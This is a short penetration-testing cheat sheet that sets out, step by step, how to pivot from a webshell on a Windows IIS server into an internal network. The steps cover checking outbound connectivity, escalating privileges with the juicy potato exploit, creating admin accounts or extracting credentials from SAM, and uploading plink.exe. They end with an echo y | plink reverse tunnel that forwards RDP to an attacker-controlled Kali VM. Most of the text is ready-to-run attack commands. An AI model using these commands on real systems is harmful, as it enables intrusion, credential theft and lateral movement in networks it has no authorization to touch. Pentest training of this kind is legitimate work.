Pivoting with SSH Tunnels and Plink on a Windows server (basic example)
======================================================================================================


Step 1. During a penetration test you managed to hack a vulnerable Internet facing website and you uploaded a webshell on the underlying IIS Web server
        (which is running on a Windows server).


Step 2. Using your webshell and native commands like 'Test-NetConnection' (or tools like 'portqry'), you checked that the underlying Windows server 
        can browse the Internet without going through a corporate proxy.

        + Examples for the command 'Test-NetConnection'
          > powershell -c Test-NetConnection google.com -Port 443
          > powershell -c "test-netconnection www.website.com -CommonTCPPort HTTP"

        + Examples for the Microsoft command line tool 'portqry.exe' or 'portqryv2.exe' (you will need to upload it on the server)
          > portqry.exe -n <public-IP> -e <port>
          > portqry.exe -n <public_name_to_query> -e <port>


Step 3. If you are lucky your webshell is already running as 'NT AUTHORITY\System' and if not you need to escalate your privileges to become local admin
        (using for example the juicy potato exploit). Then create a new local admin account or extract local admin creds from SAM registry or memory...


Step 4.  Upload the command line tool 'plink.exe' (included in Putty package) on the underlying Windows server


Step 5. Create a SSH tunnel using 'plink.exe' to a remote Internet facing server that you control. You can use a Kali Linux VM hosted on AWS or Azure Public Cloud.

        > echo y | c:\windows\temp\plink.exe <public-IP-pentester-kali-VM> -l <username> -pw <password> -P 443 -C -R 0.0.0.0:1080:<victim-server-local-IP>:3389 


Step 6. Use RDP over the SSH tunnel to log into the compromised Windows server from Internet and pivot to attack the internal network.

        # apt install rdesktop
        # rdesktop -u <local-admin-username> 192.168.50.5
